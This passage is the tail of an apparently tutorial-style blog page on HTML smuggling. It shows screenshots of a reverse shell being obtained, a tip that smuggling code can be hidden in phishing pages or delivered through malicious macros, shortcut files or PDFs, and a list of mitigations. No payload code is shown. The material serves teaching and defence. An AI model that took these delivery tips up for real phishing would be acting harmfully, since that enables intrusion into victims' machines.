+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyGuX4i6h0X7MYhNbLG05OhVwu9GwCfeOZg3ASvaOGPg60amviJ9XW_0kkiou-rBgqdVfaNv7YjaHFI8HsZDS5I2J9J2vYbh2BmH8z3RcVwD-0Es8mABgwPLqqv8ISMuQxexqpe87FusSivpB1sPhKUPL7uvB18YIeflee_1pPTj8zLuUKaarpGWnnmQ/s16000/13.png" alt="" /></p>
+<p>Once executed, we&rsquo;ll get a reverse shell!</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhcMm_QcP4ev4iEeDm0GZ-e6t6giHvaLoWVrCZKcZ_EITHyl8eXXZk5LYAxvszydqjezuFk__j6HHgPiFKfl5s24yV3NLRnD_bAZ1mp2TsPnZC6FAgul-3vhljCjKF8ab-wdgJEUx850_PQrktO_UUq1tmjXnT4X7D_hH-a-i65L8RthpqPf2uIMjy4sA/s16000/14.png" alt="" /></p>
+<p><strong>NOTE:&nbsp;</strong>HTML smuggling code can be sneaked into any legit phishing page in order to increase its chances of getting executed by the user. You may also use advanced methods like MS Office documents with malicious macros, shortcut files or maybe malicious pdfs.</p>
+<h3>Mitigation</h3>
+<p>Following are recommended to protect against HTML Smuggling attacks:</p>
+<ul>
+<li>Configure security products to block against pages using JS or VBScript from automatically running a downloaded executable</li>
+<li>Whitelist executable filenames</li>
+<li>Set .js and .jse to open with notepad by default and not a browser</li>
+<li>Aware users must manually review e-mail attachments</li>
+<li>Set behaviour rules for HTML pages that decode base64 code or obfuscate a JS script.</li>
+</ul>
+<p>Other Microsoft recommendations can be found&nbsp;<strong>here</strong>.-&nbsp;https://www.microsoft.com/security/blog/2021/11/11/html-smuggling-surges-highly-evasive-loader-technique-increasingly-used-in-banking-malware-targeted-attacks/</p>
+</div>
+</div>
+</body>
+</html>
